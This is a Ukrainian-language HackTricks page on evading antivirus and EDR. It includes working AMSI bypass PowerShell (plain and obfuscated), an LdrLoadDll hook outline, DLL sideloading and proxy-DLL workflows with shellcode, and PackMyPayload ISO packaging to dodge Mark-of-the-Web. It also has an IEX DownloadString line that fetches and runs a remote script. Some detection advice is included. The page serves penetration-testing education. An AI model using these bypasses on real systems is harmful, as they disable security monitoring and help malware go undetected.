# Обхід антивірусу (AV)

{{#include ../banners/hacktricks-training.md}}

**Цю сторінку написав** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Зупинити Defender

- [defendnot](https://github.com/es3n1n/defendnot): Інструмент для припинення роботи Windows Defender.
- [no-defender](https://github.com/es3n1n/no-defender): Інструмент для припинення роботи Windows Defender шляхом імітації іншого AV.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

## **Методологія обходу AV**

Наразі AV використовують різні методи для перевірки файлу на шкідливість: static detection, dynamic analysis, і для більш просунутих EDR — behavioral analysis.

### **Static detection**

Static detection досягається шляхом позначення відомих шкідливих рядків або масивів байтів у бінарному файлі або скрипті, а також вилучення інформації з самого файлу (наприклад, file description, company name, digital signatures, icon, checksum тощо). Це означає, що використання відомих публічних інструментів може призвести до виявлення легше, оскільки вони, ймовірно, вже були проаналізовані і позначені як шкідливі. Є кілька способів обійти такий тип виявлення:

- **Encryption**

Якщо ви зашифруєте бінарний файл, AV не зможе його виявити, але вам знадобиться якийсь loader, щоб розшифрувати і запустити програму в пам'яті.

- **Obfuscation**

Іноді достатньо змінити кілька рядків у бінарному файлі або скрипті, щоб обійти AV, але це може зайняти багато часу залежно від того, що саме ви намагаєтесь обфускувати.

- **Custom tooling**

Якщо ви розробляєте власні інструменти, не буде відомих шкідливих сигнатур, але це вимагає багато часу і зусиль.

> [!TIP]
> Гарний спосіб перевірити static detection Windows Defender — це [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Він фактично розбиває файл на кілька сегментів і просить Defender просканувати кожен окремо, таким чином можна точно дізнатися, які рядки або байти у вашому бінарному файлі позначено.

Рекомендую переглянути цей [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) про практичний AV Evasion.

### **Dynamic analysis**

Dynamic analysis — це коли AV запускає ваш бінарний файл у sandbox і спостерігає за шкідливою активністю (наприклад, спроби розшифрувати і прочитати паролі браузера, виконати minidump на LSASS тощо). З цим працювати трохи складніше, але ось кілька прийомів для уникнення sandbox.

- **Sleep before execution** Залежно від реалізації це може добре допомогти обійти dynamic analysis AV. AV мають дуже короткий час на сканування файлів, щоб не переривати роботу користувача, тому тривалі паузи можуть зрушити аналіз бінарників. Проблема в тому, що багато sandbox можуть просто пропустити sleep залежно від реалізації.
- **Checking machine's resources** Зазвичай sandbox мають дуже мало ресурсів (< 2GB RAM), інакше вони б уповільнювали машину користувача. Тут можна проявити креативність — наприклад, перевіряти температуру CPU або швидкість вентиляторів; не все буде реалізовано в sandbox.
- **Machine-specific checks** Якщо ви хочете таргетувати користувача, чиє робоче місце приєднане до домену "contoso.local", ви можете перевірити домен комп'ютера і, якщо він не співпадає, завершити роботу програми.

Виявилося, що computername Sandbox Microsoft Defender — HAL9TH, тож ви можете перевіряти ім'я комп'ютера у своєму malware перед детонацією: якщо ім'я співпадає з HAL9TH, це означає, що ви в defender's sandbox, і можна завершити виконання програми.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>джерело: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Декілька інших дуже корисних порад від [@mgeeky](https://twitter.com/mariuszbit) щодо протидії Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> канал #malware-dev</p></figcaption></figure>

Як вже згадувалося, **public tools** рано чи пізно **будуть виявлені**, тож варто задати собі питання:

Наприклад, якщо ви хочете дампити LSASS, **чи дійсно вам потрібно використовувати mimikatz**? Або можна знайти інший проєкт, менш відомий, який також дампить LSASS.

Правильна відповідь — швидше за все друге. На прикладі mimikatz: це, мабуть, один із найбільш (якщо не найпоширеніший) плаґінів, позначених AV та EDR; хоча проєкт дуже крутий, з ним жахливо працювати, щоб обійти AV, тому просто шукайте альтернативи для досягнення вашої мети.

> [!TIP]
> Коли модифікуєте payloads для evasion, обов'язково вимкніть automatic sample submission у defender, і, будь ласка, серйозно — **НЕ ЗАВАНТАЖУЙТЕ НА VIRUSTOTAL**, якщо ваша мета — довготривала евазія. Якщо хочете перевірити, чи виявляє ваш payload конкретний AV, встановіть його у VM, спробуйте вимкнути automatic sample submission і тестуйте там, поки не будете задоволені результатом.

## EXEs vs DLLs

Коли це можливо, завжди **надавайте перевагу використанню DLL для evasion** — з мого досвіду, DLL файли зазвичай **набагато рідше виявляються** і аналізуються, тож це простий трюк, щоб уникнути виявлення в деяких випадках (якщо ваш payload може запускатися як DLL, звісно).

Як видно на цьому зображенні, DLL Payload від Havoc має detection rate 4/26 на antiscan.me, тоді як EXE payload має 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me порівняння звичного Havoc EXE payload vs звичного Havoc DLL</p></figcaption></figure>

Тепер покажемо кілька прийомів, які можна використовувати з DLL, щоб бути набагато більш стелсними.

## DLL Sideloading & Proxying

**DLL Sideloading** використовує порядок пошуку DLL, який застосовує loader, розміщуючи як вразливий додаток, так і шкідливі payload поруч.

Ви можете шукати програми, вразливі до DLL Sideloading, за допомогою [Siofra](https://github.com/Cybereason/siofra) та наступного powershell скрипта:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
This command will output the list of programs susceptible to DLL hijacking inside "C:\Program Files\\" and the DLL files they try to load.

Настійно рекомендую особисто **перевіряти DLL Hijackable/Sideloadable програми**; при правильному виконанні ця техніка доволі прихована, але якщо використати публічно відомі DLL Sideloadable програми, вас можуть легко виявити.

Просто розмістивши шкідливий DLL з іменем, яке програма очікує завантажити, не вдасться завантажити ваш payload, оскільки програма очікує певні конкретні функції в цьому DLL; щоб вирішити цю проблему, ми використаємо іншу техніку, яка називається **DLL Proxying/Forwarding**.

**DLL Proxying** переспрямовує виклики, які програма робить, з proxy (and malicious) DLL до оригінального DLL, зберігаючи функціональність програми і дозволяючи обробити виконання вашого payload.

Я буду використовувати проект [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) від [@flangvik](https://twitter.com/Flangvik/)

Ось кроки, які я виконав:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Остання команда дасть нам 2 файли: шаблон вихідного коду DLL та оригінальну перейменовану DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
Ось результати:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Обидва наші shellcode (encoded with [SGN](https://github.com/EgeBalci/sgn)) та proxy DLL мають показник виявлення 0/26 на [antiscan.me](https://antiscan.me)! Я вважаю це успіхом.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Я **надзвичайно рекомендую** подивитися [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) про DLL Sideloading, а також [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE), щоб детальніше вивчити те, про що ми говорили.

### Зловживання Forwarded Exports (ForwardSideLoading)

Модулі Windows PE можуть експортувати функції, які насправді є "forwarders": замість вказівки на код, запис експорту містить ASCII-рядок у форматі `TargetDll.TargetFunc`. Коли викликач резолвить цей експорт, Windows loader зробить:

- Load `TargetDll` if not already loaded
- Resolve `TargetFunc` from it

Ключові особливості, що їх треба розуміти:
- Якщо `TargetDll` є KnownDLL, він постачається з захищеного простору імен KnownDLLs (наприклад, ntdll, kernelbase, ole32).
- Якщо `TargetDll` не є KnownDLL, використовується звичайний порядок пошуку DLL, який включає директорію модуля, що виконує резолюцію форварда.

Це дає можливість опосередкованого механізму sideloading: знайдіть підписаний DLL, який експортує функцію, форвардовану на модуль з іменем, що не є KnownDLL, потім розмістіть цей підписаний DLL у тій же директорії разом із DLL, контрольованим зловмисником, з точним ім’ям цільового форвардованого модуля. Коли форвардований експорт викликається, loader розв'язує форвард і завантажує ваш DLL з тієї ж директорії, виконуючи ваш DllMain.

Приклад, спостережений на Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` не є KnownDLL, тому він завантажується відповідно до звичайного порядку пошуку.

PoC (copy-paste):
1) Скопіюйте підписану системну DLL до папки з правами запису
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Помістіть шкідливий `NCRYPTPROV.dll` у ту ж папку. Достатньо мінімального `DllMain`, щоб отримати виконання коду; вам не потрібно реалізовувати переспрямовану функцію, щоб запустити `DllMain`.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Ініціюйте пересилання за допомогою підписаного LOLBin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Спостережувана поведінка:
- rundll32 (підписаний) завантажує side-by-side `keyiso.dll` (підписаний)
- Під час розв'язання `KeyIsoSetAuditingInterface` завантажувач переходить за переадресацією до `NCRYPTPROV.SetAuditingInterface`
- Завантажувач потім завантажує `NCRYPTPROV.dll` з `C:\test` і виконує його `DllMain`
- Якщо `SetAuditingInterface` не реалізовано, ви отримаєте помилку "missing API" лише після того, як `DllMain` вже виконався

Поради для виявлення:
- Зосередьтеся на forwarded exports, де цільовий модуль не є KnownDLL. KnownDLLs перелічені в `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Ви можете перерахувати forwarded exports за допомогою інструментів, таких як:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Перегляньте інвентар форвардерів Windows 11, щоб знайти кандидатів: https://hexacorn.com/d/apis_fwd.txt

Ідеї для виявлення/захисту:
- Моніторте LOLBins (e.g., rundll32.exe), які завантажують підписані DLL з несистемних шляхів, а потім завантажують non-KnownDLLs з тією ж базовою назвою з цього каталогу
- Сповіщайте про ланцюжки процесів/модулів, наприклад: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` у шляхах, доступних для запису користувачем
- Застосовуйте політики цілісності коду (WDAC/AppLocker) і забороняйте write+execute в каталогах додатків

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Ви можете використовувати Freeze, щоб приховано завантажити та виконати ваш shellcode.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Уникнення виявлення — це гра кішки й миші: те, що працює сьогодні, може бути виявлене завтра, тому ніколи не покладайтеся лише на один інструмент; за можливості намагайтесь поєднувати кілька технік ухилення.

## AMSI (Anti-Malware Scan Interface)

AMSI було створено для запобігання "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Спочатку AV могли сканувати лише файли на диску, тож якщо вдалося якимось чином виконати payloads безпосередньо в пам'яті, AV не мав достатньої видимості, щоб це зупинити.

Функція AMSI інтегрована у такі компоненти Windows.

- User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

Вона дозволяє антивірусним рішенням інспектувати поведінку скриптів, надаючи вміст скриптів у незашифрованому та незаобфускованому вигляді.

Запуск `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` викличе наступне сповіщення у Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Зверніть увагу, як він додає префікс `amsi:` і потім шлях до виконуваного файлу, з якого запущено скрипт — у цьому випадку powershell.exe

Ми не скидали жодного файлу на диск, але все одно потрапили виявленими в пам'яті через AMSI.

Крім того, починаючи з **.NET 4.8**, C# код теж пропускається через AMSI. Це навіть впливає на `Assembly.Load(byte[])` для завантаження та виконання в пам'яті. Тому для in-memory execution іноді рекомендують використовувати нижчі версії .NET (наприклад 4.7.2 або нижче), якщо ви хочете уникнути AMSI.

Існує кілька способів обійти AMSI:

- **Obfuscation**

Оскільки AMSI переважно працює зі статичними сигнатурами, зміна скриптів, які ви намагаєтесь завантажити, може бути хорошим способом ухилитися від виявлення.

Однак AMSI має можливість деобфускувати скрипти навіть якщо вони мають кілька шарів обфускації, тож обфускація може бути поганим варіантом залежно від того, як вона виконана. Це робить ухилення не таким вже й простим. Хоча іноді достатньо змінити кілька імен змінних — і цього вистачить, тому все залежить від того, наскільки щось вже було помічено.

- **AMSI Bypass**

Оскільки AMSI реалізовано шляхом завантаження DLL у процес powershell (також cscript.exe, wscript.exe тощо), з ним можна легко взаємодіяти навіть під непривілейованим користувачем. Через цю помилку в реалізації AMSI дослідники знайшли кілька способів уникнення AMSI-сканування.

**Forcing an Error**

Примусове невдале ініціалізування AMSI (amsiInitFailed) призведе до того, що для поточного процесу сканування не відбудеться. Спочатку це було оприлюднено [Matt Graeber](https://twitter.com/mattifestation), і Microsoft розробила сигнатуру, щоб запобігти широкому використанню.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Все, що було потрібно — один рядок коду powershell, щоб зробити AMSI непридатним для поточного процесу powershell. Цей рядок, звісно, був позначений самим AMSI, тож для використання цієї техніки потрібні деякі модифікації.

Ось модифікований AMSI bypass, який я взяв з цього [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Keep in mind, that this will probably get flagged once this post comes out, so you should not publish any code if your plan is staying undetected.

**Memory Patching**

This technique was initially discovered by [@RastaMouse](https://twitter.com/_RastaMouse/) and it involves finding address for the "AmsiScanBuffer" function in amsi.dll (responsible for scanning the user-supplied input) and overwriting it with instructions to return the code for E_INVALIDARG, this way, the result of the actual scan will return 0, which is interpreted as a clean result.

> [!TIP]
> Please read [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) for a more detailed explanation.

There are also many other techniques used to bypass AMSI with powershell, check out [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) and [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) to learn more about them.

### Блокування AMSI шляхом запобігання завантаженню amsi.dll (LdrLoadDll hook)

AMSI is initialised only after `amsi.dll` is loaded into the current process. A robust, language‑agnostic bypass is to place a user‑mode hook on `ntdll!LdrLoadDll` that returns an error when the requested module is `amsi.dll`. As a result, AMSI never loads and no scans occur for that process.

Implementation outline (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Примітки
- Працює в PowerShell, WScript/CScript та у власних завантажувачах (в усьому, що в іншому випадку завантажило б AMSI).
- Поєднуйте з передачею скриптів через stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`), щоб уникнути довгих артефактів командного рядка.
- Спостерігалося використання в завантажувачах, що виконуються через LOLBins (наприклад, `regsvr32`, що викликає `DllRegisterServer`).

This tools [https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail) also generates script to bypass AMSI.

**Видалити виявлену сигнатуру**

Ви можете використовувати інструменти, такі як **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** та **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)**, щоб видалити виявлену сигнатуру AMSI з пам'яті поточного процесу. Цей інструмент працює шляхом сканування пам'яті поточного процесу на наявність сигнатури AMSI, а потім перезаписує її інструкціями NOP, фактично видаляючи її з пам'яті.

**Продукти AV/EDR, що використовують AMSI**

Список продуктів AV/EDR, що використовують AMSI, можна знайти в **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Використовуйте PowerShell версії 2**
Якщо ви використовуєте PowerShell версії 2, AMSI не буде завантажено, тож ви можете запускати скрипти без їх сканування AMSI. Можна зробити так:
```bash
powershell.exe -version 2
```
## Логування PowerShell

PowerShell logging — це функція, яка дозволяє записувати всі команди PowerShell, виконані на системі. Це корисно для аудитів та усунення неполадок, проте також може бути великою проблемою для атакувальників, які хочуть уникнути виявлення.

Щоб обійти логування PowerShell, можна використати такі техніки:

- **Disable PowerShell Transcription and Module Logging**: Можна використати інструмент, такий як [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) для цієї мети.
- **Use Powershell version 2**: Якщо ви використовуєте PowerShell версії 2, AMSI не буде завантажено, тож ви зможете виконувати свої скрипти без їх сканування AMSI. Можна зробити так: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: Використайте [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) щоб запустити PowerShell без захистів (це те, що використовує `powerpick` з Cobal Strike).


## Обфускація

> [!TIP]
> Декілька технік обфускації покладаються на шифрування даних, що підвищує ентропію бінарного файлу і полегшує його виявлення AVs та EDRs. Будьте обережні з цим і, можливо, застосовуйте шифрування лише до конкретних частин коду, які є чутливими або потребують приховування.

### Деобфускація .NET бінарників, захищених ConfuserEx

При аналізі malware, що використовує ConfuserEx 2 (або комерційні форки), часто зустрічаються кілька шарів захисту, які блокують decompilers та sandboxes. Нижченаведений робочий процес надійно **відновлює майже оригінальний IL**, який потім можна decompile-нути до C# у таких інструментах, як dnSpy або ILSpy.

1.  Anti-tampering removal – ConfuserEx encrypts every *method body* and decrypts it inside the *module* static constructor (`<Module>.cctor`).  This also patches the PE checksum so any modification will crash the binary.  Use **AntiTamperKiller** to locate the encrypted metadata tables, recover the XOR keys and rewrite a clean assembly:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Вивід містить 6 anti-tamper параметрів (`key0-key3`, `nameHash`, `internKey`), які можуть бути корисними при написанні власного unpacker-а.

2.  Symbol / control-flow recovery – передайте *clean* файл у **de4dot-cex** (форк de4dot, сумісний з ConfuserEx).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Параметри:
• `-p crx` – обрати профіль ConfuserEx 2  
• de4dot відмінить control-flow flattening, відновить оригінальні простори імен, класи та імена змінних, а також дешифрує константні рядки.

3.  Proxy-call stripping – ConfuserEx замінює прямі виклики методів на легкі обгортки (так звані *proxy calls*), щоб ускладнити decompilation. Видаліть їх за допомогою **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Після цього кроку ви повинні побачити звичні .NET API, такі як `Convert.FromBase64String` або `AES.Create()` замість непрозорих wrapper-функцій (`Class8.smethod_10`, …).

4.  Manual clean-up – запустіть отриманий бінарник у dnSpy, шукайте великі Base64 бінарні блоки або використання `RijndaelManaged`/`TripleDESCryptoServiceProvider`, щоб знайти *справжнє* payload. Часто malware зберігає його як TLV-encoded масив байтів, ініціалізований всередині `<Module>.byte_0`.

Вищенаведений ланцюг відновлює виконувальний потік **без** необхідності запускати зразок malware — корисно при роботі на офлайн робочій станції.

🛈  ConfuserEx produces a custom attribute named `ConfusedByAttribute` that can be used as an IOC to automatically triage samples.

#### Однорядковий приклад
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Мета цього проєкту — надати відкриту форк-версію [LLVM](http://www.llvm.org/) компіляційного набору, здатну підвищити безпеку програмного забезпечення через [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) та захист від підробки.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator демонструє, як використовувати мову `C++11/14` для генерації на етапі компіляції obfuscated code без використання зовнішніх інструментів і без модифікації компілятора.
- [**obfy**](https://github.com/fritzone/obfy): Додає шар obfuscated operations, згенерованих фреймворком C++ template metaprogramming, що ускладнить життя тому, хто захоче зламати застосунок.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz — x64 binary obfuscator, здатний обфускувати різні PE-файли, зокрема: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame — простий metamorphic code engine для довільних виконуваних файлів.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator — тонкозерниста framework для code obfuscation мов, що підтримуються LLVM, із застосуванням ROP (return-oriented programming). ROPfuscator обфускує програму на рівні assembly code, перетворюючи звичайні інструкції в ROP chains і порушуючи нашу природну картину нормального потоку управління.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt — .NET PE Crypter, написаний на Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor вміє конвертувати існуючі EXE/DLL у shellcode та завантажувати їх

## SmartScreen & MoTW

Можливо, ви бачили цей екран під час завантаження деяких виконуваних файлів з інтернету та їх запуску.

Microsoft Defender SmartScreen — це механізм безпеки, призначений для захисту кінцевого користувача від запуску потенційно шкідливих застосунків.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen в основному працює на основі підходу, заснованого на репутації: рідко завантажувані застосунки викликають спрацьовування SmartScreen, попереджаючи й заважаючи кінцевому користувачу виконати файл (хоча файл все ще можна виконати, натиснувши More Info -> Run anyway).

**MoTW** (Mark of The Web) — це [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) з ім'ям Zone.Identifier, який автоматично створюється при завантаженні файлів з інтернету, разом із URL, звідки файл було завантажено.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Перевірка Zone.Identifier ADS для файлу, завантаженого з інтернету.</p></figcaption></figure>

> [!TIP]
> Варто зауважити, що виконувані файли, підписані **довіреним** сертифікатом підпису **не спровокують SmartScreen**.

Дуже ефективний спосіб запобігти отриманню вашими payloads Mark of The Web — упакувати їх всередину якоїсь форми контейнера, наприклад ISO. Це відбувається тому, що Mark-of-the-Web (MOTW) **не може** бути застосований до **non NTFS** томів.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) — інструмент, який пакує payloads у вихідні контейнери для обходу Mark-of-the-Web.

Example usage:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) — це потужний механізм логування у Windows, який дозволяє застосункам і компонентам системи **реєструвати події**. Проте його також можуть використовувати продукти безпеки для моніторингу та виявлення шкідливої активності.

Подібно до того, як AMSI відключають (обходять), також можна змусити функцію **`EtwEventWrite`** у процесі користувацького простору негайно повертати управління без запису подій. Це робиться шляхом патчу функції в пам'яті так, щоб вона одразу повертала, фактично вимикаючи логування ETW для цього процесу.

Детальніше можна прочитати в **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) і [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Завантаження C# бінарних файлів у пам'ять відоме давно і все ще є дуже хорошим способом запуску ваших post-exploitation інструментів, не будучи виявленим AV.

Оскільки payload завантажується безпосередньо в пам'ять без запису на диск, нам потрібно лише подбати про патчинг AMSI для всього процесу.

Більшість C2 фреймворків (sliver, Covenant, metasploit, CobaltStrike, Havoc тощо) вже надають можливість виконувати C# assemblies безпосередньо в пам'яті, але існують різні способи це робити:

- **Fork\&Run**

Це включає в себе **створення нового "жертвенного" процесу**, інжекцію вашого post-exploitation шкідливого коду в цей новий процес, виконання коду і після завершення знищення цього процесу. Це має як переваги, так і недоліки. Перевага методу fork and run в тому, що виконання відбувається **поза** нашим Beacon implant процесом. Це означає, що якщо щось піде не так або буде виявлено під час post-exploitation дій, існує **набагато більша ймовірність**, що наш **implant виживе.** Недолік у тому, що ви маєте **вищий ризик** бути виявленим через **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Це про інжекцію post-exploitation шкідливого коду **власному процесі**. Таким чином ви уникаєте створення нового процесу і його сканування AV, але недолік в тому, що якщо щось піде не так під час виконання вашого payload, існує **набагато більша ймовірність** **втратити ваш beacon**, оскільки процес може впасти.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Якщо ви хочете дізнатися більше про завантаження C# Assembly, будь ласка, перегляньте цю статтю [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) та їх InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Ви також можете завантажувати C# Assemblies **з PowerShell**, подивіться [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) і відео S3cur3th1sSh1t ([https://www.youtube.com/watch?v=oe11Q-3Akuk](https://www.youtube.com/watch?v=oe11Q-3Akuk)).

## Using Other Programming Languages

Як запропоновано в [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), можливо виконувати шкідливий код іншими мовами, надаючи скомпрометованій машині доступ **до інтерпретаторного середовища, встановленого на Attacker Controlled SMB share**.

Дозволяючи доступ до Interpreter Binaries і середовища на SMB share, ви можете **виконувати довільний код цими мовами у пам'яті** скомпрометованої машини.

Репозиторій зазначає: Defender все ще сканує скрипти, але, використовуючи Go, Java, PHP тощо, ми отримуємо **більшу гнучкість для обходу статичних сигнатур**. Тестування з випадковими необфускованими reverse shell скриптами цими мовами показало успішні результати.

